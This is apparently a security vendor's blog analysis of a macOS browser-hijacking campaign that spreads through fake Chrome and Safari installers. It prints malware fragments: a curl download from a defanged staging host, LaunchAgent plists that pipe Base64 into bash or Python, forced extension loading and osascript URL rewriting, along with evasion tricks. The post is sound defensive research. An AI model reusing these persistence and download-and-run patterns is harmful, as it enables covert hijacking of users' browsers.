        <h1>CrowdStrike Uncovers New MacOS Browser Hijacking Campaign</h1>
        
        <div class="publish_info">
            <p>June 02, 2022</p>
            <span>|</span>
            <a href="/en-us/blog/author.mitch-datka/" title="Posts by Mitch Datka" rel="author">
                Mitch Datka</a>
            <span>|</span>
                
            <a href="/en-us/blog/category.endpoint-protection/" title="Endpoint Security &amp; XDR">Endpoint Security &amp; XDR</a>
        </div>
        <div class="post_image">
            <img width="1060" height="698" src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-1-1-1" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-1-1-1.jpeg 1060w,https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-1-1-1-768x506 768w,https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-1-1-1-1024x674 1024w,https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog_1060x698-1-1-1-300x198 300w" sizes="(max-width: 1060px) 100vw, 1060px"/>

<div class="cmp-text" id="text-bc380bd0e6" data-cmp-name="cmp-text-" data-cmp-is="text" data-target-location="false">
    
       <span><ul><li style="	font-weight: 400;
"><span style="	font-weight: 400;
">CrowdStrike analyzed a new browser hijacking campaign that targets MacOS</span></li><li style="	font-weight: 400;
"><span style="	font-weight: 400;
">The purpose of the campaign is to inject ads into the user’s Chrome or Safari browser<p> </p></span></li><li style="	font-weight: 400;
"><span style="	font-weight: 400;
">The </span><a href="/en-us/endpoint-security-products/falcon-platform/"><span style="	font-weight: 400;
">CrowdStrike Falcon<sup>®</sup> platform</span></a><span style="	font-weight: 400;
"> provides continuous protection against browser hijacking threats by offering real-time visibility across workloads</span></li></ul>
<span style="	font-weight: 400;
">The CrowdStrike Content Research team recently analyzed a MacOS targeted browser hijacking campaign that modifies the user’s browsing experience to deliver ads. Research began with a variant that uses a combination of known techniques to deliver, persist and sideload a Chrome extension. Analysis of the fake Chrome installer uncovered the use of more than 40 unique dropper files to install the extension. During analysis of the original samples, an additional variant was discovered that targets Safari browser usage and employs a combination of AppleScript and Python to accomplish similar browser hijacking activity. At the time of writing, more than 15 unique dropper files have been found for this particular variant.</span>
<h2><span style="	font-weight: 400;
">Technical Analysis</span></h2>
<h3><span style="	font-weight: 400;
">Fake Chrome Installer</span></h3>
<span style="	font-weight: 400;
">The Chrome variant sideloads a malicious Chrome extension with the purpose of hijacking browser activity and delivering custom ad content.<p> </p></span>
<h4><span style="	font-weight: 400;
">Installation</span></h4>
<span style="	font-weight: 400;
">The initial infection vector uses an Apple Disk Image (DMG) that masquerades as legitimate software and video files. Once the DMG file is mounted on the machine and the user is tricked into clicking the application icon, an install script is executed to initialize the setup process, as shown in Figure 1.</span>

<div class="wp-caption" id="attachment_122835"><img class="size-full wp-image-122835" src="/content/dam/crowdstrike/www/en-us/wp/2022/06/Figure1.png" alt="" width="1316" height="856"/> Figure 1. Example of DMG installation instructions</div>

<span style="	font-weight: 400;
">While the DMG file names are masquerading as software and video files, they all share a similarity and result in a mounted volume with the name </span><span style="	font-weight: 400;
"><code>Application Installer</code>.</span><span style="	font-weight: 400;
"> The mounted volume prompts the user to execute an apparent Chrome installation application, but this is actually a malicious script file contained in the DMG. Early variants of this family used script files named </span><code><span style="	font-weight: 400;
">installer.command</span></code><span style="	font-weight: 400;
">. Later variants use </span><code><span style="	font-weight: 400;
">ChromeInstaller.command </span></code><span style="	font-weight: 400;
">script files.<p> </p></span>

<span style="	font-weight: 400;
">Upon initialization, the install script hides visible Terminal windows from the user’s view by leveraging </span><code><span style="	font-weight: 400;
">osascript </span></code><span style="	font-weight: 400;
">to conceal the installation actions. Then it makes a query for an existing infection by checking the results of </span><code><span style="	font-weight: 400;
">launchctl list | grep &#34;chrome.extension&#34;</span></code><span style="	font-weight: 400;
"> and exits if the command returns any matching </span><code><span style="	font-weight: 400;
">launchd</span></code><span style="	font-weight: 400;
"> jobs.<p> </p></span>

<span style="	font-weight: 400;
">Prior to downloading the extension, an attempt is made to validate the returned status code from the web server using curl</span><span style="	font-weight: 400;
">:</span>
<pre><code>status_code&#61;$(curl --write-out %{http_code} --head --silent --output /dev/null https&lt;:&gt;//ckgrounda&lt;.&gt;com/archive.zip )</code></pre>
<span style="	font-weight: 400;
">If the return code is 200, curl is again used to download and write the archive file with the zipped payload written to </span><code><span style="	font-weight: 400;
">/private/var/temp/.zip</span></code><span style="	font-weight: 400;
">. The native </span><code><span style="	font-weight: 400;
">unzip</span></code><span style="	font-weight: 400;
"> utility is used to expand the archive into a new folder also named with a random UUID in </span><code><span style="	font-weight: 400;
">/private/var/temp/</span></code><span style="	font-weight: 400;
">. Any other return code results in the script exiting.<p> </p></span>
<h4><span style="	font-weight: 400;
">Persistence<p> </p></span></h4>
<span style="	font-weight: 400;
">The Chrome extension is installed and maintained by a number of plist files written to the user directory </span><span style="	font-weight: 400;
"><code>~/Library/LaunchAgent/</code>. </span><span style="	font-weight: 400;
">To conceal the malicious behavior, the underlying commands in the plist files are obfuscated with Base64 encoding.</span>
<pre><code>&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;sh&lt;/string&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;string&gt;echo aWYgcHMg -&lt; SNIP &gt;- Zmk&#61; | base64 --decode | bash&lt;/string&gt;
&lt;/array&gt;
</code></pre>
<span style="	font-weight: 400;
">Below is a list of each file created, the Base64 decoded file contents and the description.</span>
<table class="orange"><tbody><tr class="top-row bg-orange"><td>StartInterval Values (seconds)</td><td>Decoded Plist Payloads</td><td>Description</td></tr><tr><td colspan="3"><code>com.chrome.extension.plist</code></td></tr><tr><td>31</td><td><code>if ps ax | grep -v grep | grep &#39;Google Chrome&#39; &amp;&gt; /dev/null; then echo running;<p> </p> EXTENSION_SERVICE&#61;&#39;Google Chrome --load-extension&#39;; if ps ax | grep -v grep | grep &#39;Google Chrome --load-extension&#39; &amp;&gt; /dev/null; then echo e running; else <p> </p> pkill -a -i &#39;Google Chrome&#39;; sleep 1 ;<p> </p> open -a &#39;Google Chrome&#39; --args --load-extension&#61;&#39;/private/var/temp/&#39; --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi;<p> </p> else echo not running; fi</code></td><td>Resolve/hide crashes</td></tr><tr><td colspan="3"><code>com.chrome.extensions.plist</code></td></tr><tr><td>21600</td><td><code>pkill -a -i &#39;Google Chrome&#39;; sleep 1 ;<p> </p> open -a &#39;Google Chrome&#39; --args --load-extension&#61;&#39;/private/var/temp/&#39; --restore-last-session --noerrdialogs --disable-session-crashed-bubble;</code></td><td>Force the extension load</td></tr><tr><td colspan="3"><code>com.chrome.extensionsPop.plist</code></td></tr><tr><td>3600</td><td><code>open -na &#39;Google Chrome&#39; --args -load-extension&#61;&#39;/private/var/temp/&#39; --new-window &#34;$https&lt;:&gt;//ationwindon&lt;.&gt;com/?tid&#61;949115&#34;</code></td><td>Ensure ad is always open</td></tr></tbody></table>
<span style="	font-weight: 400;
">As shown above, the naming convention of the plist files attempts to evade general suspicion by masquerading as components of the Chrome browser.<p> </p></span>

<span style="	font-weight: 400;
">All of the Launch Agents utilize a </span><code><span style="	font-weight: 400;
">StartInterval</span></code><span style="	font-weight: 400;
"> parameter. This means that each is executed periodically on its defined interval.<p> </p></span>

<span style="	font-weight: 400;
">Note that the </span><code><span style="	font-weight: 400;
">com.chrome.extensionsPop.plist</span></code><span style="	font-weight: 400;
"> appears to have a typo in the “</span><span style="	font-weight: 400;
"><code>-load-extension</code>”</span><span style="	font-weight: 400;
"> parameter; however, the command works as expected and is successful in sideloading the extension. A notable commonality across the variants analyzed is the check-in domain </span><code><span style="	font-weight: 400;
">ationwindon&lt;.&gt;com</span></code><span style="	font-weight: 400;
">.<p> </p><p> </p></span>
<h4><span style="	font-weight: 400;
">Extension Initialization<p> </p></span></h4>
<span style="	font-weight: 400;
">The extension is sideloaded from disk via any of the plists using the </span><code><span style="	font-weight: 400;
">--load-extension</span></code><span style="	font-weight: 400;
"> parameter. The extension utilizes a number of alarms and blocking listeners to facilitate its browser hijacking and ad content delivery.</span>

<span style="	font-weight: 400;
">The extension contains a hard-coded command-and-control (C2) domain referred to in this blog as </span><code><span style="	font-weight: 400;
">C2Domain</span></code><span style="	font-weight: 400;
">, and a unique identifying string defined as </span><code><span style="	font-weight: 400;
">ExtensionId</span></code><span style="	font-weight: 400;
">. These static values are used to reference the C2 domain and extension ID in the blog; however, each extension analyzed contained its own unique values.<p> </p></span>

<span style="	font-weight: 400;
">The extension contains a system to provide time-dependent storage for ad content and dynamic parameters sent from the C2. This is accomplished by storing and retrieving JSON objects from Chrome’s </span><code><span style="	font-weight: 400;
">localStorage</span></code><span style="	font-weight: 400;
">. Key/Value pairs are stored with </span><code><span style="	font-weight: 400;
">expiry</span></code><span style="	font-weight: 400;
"> value. Retrieved objects with an </span><code><span style="	font-weight: 400;
">expiry</span></code><span style="	font-weight: 400;
"> value less than the current time are returned as </span><code><span style="	font-weight: 400;
">null</span></code><span style="	font-weight: 400;
"> and removed from </span><code><span style="	font-weight: 400;
">localStorage</span></code><span style="	font-weight: 400;
">.<p> </p></span>

<span style="	font-weight: 400;
">Upon execution, the extension establishes two Chrome alarms: a heartbeat and an update frequency for ad content. The heartbeat alarm fires every three hours while the ad alarm triggers every 30 minutes. After configuring these parameters, the extension beacons to the C2 with a message signifying a successful install. It is sent using the following format:</span>
<pre><code>https:///install?ext&#61;&amp;ver&#61;&amp;dd&#61;</code></pre>
<span style="	font-weight: 400;
">Following the beacon and an initial heartbeat, the extension enumerates all installed extensions running in Chrome using a </span><code><span style="	font-weight: 400;
">chrome.management.getAll()</span></code><span style="	font-weight: 400;
"> call. The </span><code><span style="	font-weight: 400;
">ExtensionInfo&lt;&gt;</span></code><span style="	font-weight: 400;
"> response is sent as JSON in a POST message back to the C2 domain.</span>

<span style="	font-weight: 400;
">The POST response contains a list of extensions IDs in a JSON list. These IDs are then used to disable extensions using </span><code><span style="	font-weight: 400;
">chrome.management.setEnabled()</span></code><span style="	font-weight: 400;
"> API calls. This is done to remove extensions that conflict with the hijacking functionality.<p> </p></span>

<span style="	font-weight: 400;
">As a final install step, the extension modifies a policy in Chrome to disable search suggestions by disabling the </span><code><span style="	font-weight: 400;
">searchSuggestEnabled</span></code><span style="	font-weight: 400;
"> field. This also disables keyword search and autocompletion capabilities.<p> </p></span>

<span style="	font-weight: 400;
">The first listener monitors web requests destined for the hardcoded C2 domain. Any requests to the domain are appended with the </span><code><span style="	font-weight: 400;
">ExtensionId</span></code><span style="	font-weight: 400;
"> as a </span><code><span style="	font-weight: 400;
">requestHeader</span></code><span style="	font-weight: 400;
">. This additional request header serves to identify victims. Responses from this domain are also monitored for a randomness variable (</span><code><span style="	font-weight: 400;
">rand</span></code><span style="	font-weight: 400;
">) in the </span><code><span style="	font-weight: 400;
">requestHeader</span></code><span style="	font-weight: 400;
">. This randomness variable is stored in </span><code><span style="	font-weight: 400;
">localStorage</span></code><span style="	font-weight: 400;
"> with an expiration time of 300 seconds. The randomness variable is used to provide inconsistency to the search hijacking functionality.</span>

<strong>Hijack via a Blocking Listener</strong>

<span style="	font-weight: 400;
">Next, the extension establishes a blocking listener to facilitate the search hijacking. This listener runs on outbound requests to URLs containing “</span><span style="	font-weight: 400;
"><code>google.</code>”</span><span style="	font-weight: 400;
">,</span><span style="	font-weight: 400;
"> “<code>search.yahoo</code>”</span><span style="	font-weight: 400;
"> or “</span><span style="	font-weight: 400;
"><code>bing.</code>”</span><span style="	font-weight: 400;
">. If the requests contain search parameters, a random float value is generated between 0 and 100. If the random float is less than the </span><code><span style="	font-weight: 400;
">rand</span></code><span style="	font-weight: 400;
"> variable, then the search request is redirected to the following URL:</span>
<pre><code>https:///search?ext&#61;&amp;ver&#61;&amp;is&#61;&amp;q&#61;</code></pre>
<span style="	font-weight: 400;
">It can be theorized that the </span><code><span style="	font-weight: 400;
">rand</span></code><span style="	font-weight: 400;
"> variable exists to evade users’ suspicion that their machines are infected. With it set, only a portion of a user’s web searches will be redirected.</span>
<h4><span style="	font-weight: 400;
">Defense Evasion</span></h4>
<span style="	font-weight: 400;
">The extension configures three techniques to evade discovery and deletion. The extension adds a listener for </span><code><span style="	font-weight: 400;
">chrome://extensions</span></code><span style="	font-weight: 400;
">, and any requests to that page will be redirected to </span><code><span style="	font-weight: 400;
">chrome://settings</span></code><span style="	font-weight: 400;
">. The extension configures </span><code><span style="	font-weight: 400;
">onClicked</span></code><span style="	font-weight: 400;
"> actions so that a left or right-click on the extension’s context menu will also open a tab to </span><code><span style="	font-weight: 400;
">chrome://settings</span></code><span style="	font-weight: 400;
">. Finally, if the user is able to bypass these barriers, the extension configures an </span><code><span style="	font-weight: 400;
">UninstallURL</span></code><span style="	font-weight: 400;
"> so a tab to the following URL will be opened if the extension is successfully removed:</span>
<pre><code>https:///uninstall?ext&#61;&amp;ver&#61;&amp;dd&#61;</code></pre>
<h4><span style="	font-weight: 400;
">Core Functionality</span></h4>
<span style="	font-weight: 400;
">The core functionality of the extension comes from its two alarms. These alarms run periodically to maintain the C2 heartbeat and update the delivered ad content.<p> </p></span>

<strong>Heartbeat Alarm</strong>

<span style="	font-weight: 400;
">Every three hours, the heartbeat alarm makes a series of callouts to the C2. First, it makes a GET request to:</span>
<pre><code>https:///hb?ext&#61;&amp;ver&#61;&amp;dd&#61;</code></pre>
<span style="	font-weight: 400;
">This is followed by a GET request to </span><code><span style="	font-weight: 400;
">https:///redsync</span></code><span style="	font-weight: 400;
">, and the response of this request is sent in a call to:</span>
<pre><code>https:///sync?ext&#61;&amp;ver&#61;&amp;dd&#61;&amp;info&#61;</code></pre>
<span style="	font-weight: 400;
">The heartbeat and response do not influence the client-side code. The extension does not handle any fail requests or returned data. It just serves as a check-in to the C2 and is simply a notification of a live infection.<p> </p></span>

<strong>Ad Alarm</strong>

<span style="	font-weight: 400;
">The ad alarm runs every 30 minutes. Its objective is to ensure that the ad content is updated and running. To do this, it retrieves the </span><span style="	font-weight: 400;
">ad</span><span style="	font-weight: 400;
"> object from the expiry storage. If it is expired, new ad content is loaded from:</span>
<pre><code>https:///ad?ext&#61;&amp;ver&#61;&amp;dd&#61;</code></pre>
<span style="	font-weight: 400;
">This content is opened in a new tab, and the new tab’s </span><code><span style="	font-weight: 400;
">tabId</span></code><span style="	font-weight: 400;
"> is stored in expiry storage with a 24-hour expiration date. If the alarm runs and the ad content is not expired, then it checks to see if the </span><code><span style="	font-weight: 400;
">tabId</span></code><span style="	font-weight: 400;
"> is still open. If it isn&#39;t, it proceeds as if the ad content is expired.</span>
<h3><span style="	font-weight: 400;
">Fake Safari Installer</span></h3>
<span style="	font-weight: 400;
">Research into this family led to the discovery of a variant targeting the Safari browser. This variant shares many similarities to the Chrome variant; however, it is technically less advanced.<p> </p></span>
<h4><span style="	font-weight: 400;
">Installation</span></h4>
<span style="	font-weight: 400;
">The Safari installer variant shares a similar delivery mechanism via DMGs with random names and the </span><code><span style="	font-weight: 400;
">Application Installer</span></code><span style="	font-weight: 400;
"> volume name; however, all Safari DMGs have been observed to use script files with the naming convention </span><code><span style="	font-weight: 400;
">SafariInstaller.command</span></code><span style="	font-weight: 400;
">.</span>

<span style="	font-weight: 400;
">Much like the Chrome variant, the </span><code><span style="	font-weight: 400;
">SafariInstaller.command</span></code><span style="	font-weight: 400;
"> files download their payload from statically defined staging servers. The response contains two Base64 data blobs that decode into Python code. These blobs are inserted directly into two plist files. </span><span style="	font-weight: 400;
">Unlike the Chrome variant, the plist files pipe the Base64 decoded data to Python and then bash.</span>
<pre><code>&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;sh&lt;/string&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;string&gt;echo aW1w -&lt; SNIP &gt;- kKQ&#61;&#61; | base64 --decode | python  | bash&lt;/string&gt;
&lt;/array&gt;</code></pre>
<h4><span style="	font-weight: 400;
">Persistence and Core Functionality</span></h4>
<span style="	font-weight: 400;
">The first plist, </span><code><span style="	font-weight: 400;
">~/Library/LaunchAgents/com.safarii.extension.plist</span></code><span style="	font-weight: 400;
">, does not use a </span><code><span style="	font-weight: 400;
">StartInterval</span></code><span style="	font-weight: 400;
"> value like the Chrome variant, but instead uses </span><code><span style="	font-weight: 400;
">RunAtLoad</span></code><span style="	font-weight: 400;
">. The </span><code><span style="	font-weight: 400;
">RunAtLoad</span></code><span style="	font-weight: 400;
"> parameter is executed when the user logs into their computer. Note that the plist file does not use the correct spelling of Safari.<p> </p></span>

<span style="	font-weight: 400;
">At the time of writing, the Python payload runs in an infinite loop and serves two functions:</span>
<ol><li style="	font-weight: 400;
"><span style="	font-weight: 400;
">Sends a periodic heartbeat (approximately every hour)</span></li><li style="	font-weight: 400;
"><span style="	font-weight: 400;
">Monitors search engine queries in Safari</span></li></ol>
<span style="	font-weight: 400;
">The script ensures that only one copy is running via a call to </span><code><span style="	font-weight: 400;
">ps aux</span></code><span style="	font-weight: 400;
">. If any process commandline contain </span><code><span style="	font-weight: 400;
">base64 –decode | python</span></code><span style="	font-weight: 400;
">, then the newly executing script exits.<p> </p></span>

<span style="	font-weight: 400;
">The hourly heartbeat calls out to:</span>
<pre><code>https:///hb?ext&#61;saf&amp;ver&#61;&amp;is&#61;0&amp;dd&#61;&amp;q&#61;</code></pre>
<span style="	font-weight: 400;
">Similar to the Chrome extension, the Python script monitors searches to Google, Yahoo and Bing through the use of AppleScript. Every loop interval (~0.1 seconds), the following </span><code><span style="	font-weight: 400;
">osascript</span></code><span style="	font-weight: 400;
"> process is used to capture the currently opened Safari URL:</span>
<pre><code>osascript -e &#39;tell application &#34;safari&#34;
set curURL to URL in front document
return curURL
end tell’</code></pre>
<span style="	font-weight: 400;
">If a new search query is found, the Safari window’s URL is overwritten with:<p> </p></span>
<pre><code>https:///search?ext&#61;saf&amp;ver&#61;&amp;is&#61;0&amp;dd&#61;&amp;q&#61;</code></pre>
<span style="	font-weight: 400;
">This is accomplished by the following </span><span style="	font-weight: 400;
">osascript</span><span style="	font-weight: 400;
"> process:<p> </p></span>
<pre><code>osascript -e &#39;tell application &#34;safari&#34;
set URL in front document to &#34;&#34;
end tell’</code></pre>
<span style="	font-weight: 400;
">If the script detects that it does not have the necessary transparency, consent and control (TCC) permissions to launch </span><code><span style="	font-weight: 400;
">osascript</span></code><span style="	font-weight: 400;
"> or call out to the C2, it will launch a </span><code><span style="	font-weight: 400;
">tccutil</span></code><span style="	font-weight: 400;
"> subprocess to reset all permissions for Apple Events. By resetting this value, the user will be re-prompted with a security warning. The author is hoping that because of the new prompt, the user will allow the Apple Events communication.<p> </p></span>

<span style="	font-weight: 400;
">The </span><code><span style="	font-weight: 400;
">SafariInstaller.command</span></code><span style="	font-weight: 400;
"> script writes its second plist file to </span><code><span style="	font-weight: 400;
">~Library/LaunchAgents/com.extension.pop.plist</span></code><span style="	font-weight: 400;
">. This plist serves the same purpose as </span><code><span style="	font-weight: 400;
">com.chrome.extensionsPop.plist</span></code><span style="	font-weight: 400;
">. It uses Python and an </span><code><span style="	font-weight: 400;
">os.system</span></code><span style="	font-weight: 400;
"> call to open a new Safari window to the same </span><code><span style="	font-weight: 400;
">https&lt;:&gt;//ationwindon&lt;.&gt;com</span></code><span style="	font-weight: 400;
"> domain observed in the Chrome installer variants.</span>
<h2><span style="	font-weight: 400;
">Impact</span></h2>
<span style="	font-weight: 400;
">Both variants result in an altered user experience. Accomplished through the Chrome extension or AppleScript, both variants are highly persistent and perform browser hijacking. They are successful in continually displaying ad content and redirecting web searches to attacker-controlled redirect pages.<p> </p></span>
<h2><span style="	font-weight: 400;
">The Falcon Platform’s Continuous Monitoring and Visibility</span></h2>
<span style="	font-weight: 400;
">The Falcon platform takes a layered approach to protect workloads. Using on-sensor and cloud-based machine learning, behavior-based detection using </span><a href="/en-us/cybersecurity-101/threat-intelligence/ioa-vs-ioc/"><span style="	font-weight: 400;
">indicators of attack (IOAs)</span></a><span style="	font-weight: 400;
">, and intelligence related to tactics, techniques and procedures (TTPs) employed by threats and threat actors, the Falcon platform enables visibility, threat detection and continuous monitoring for any environment, reducing the time to detect and mitigate threats.</span>
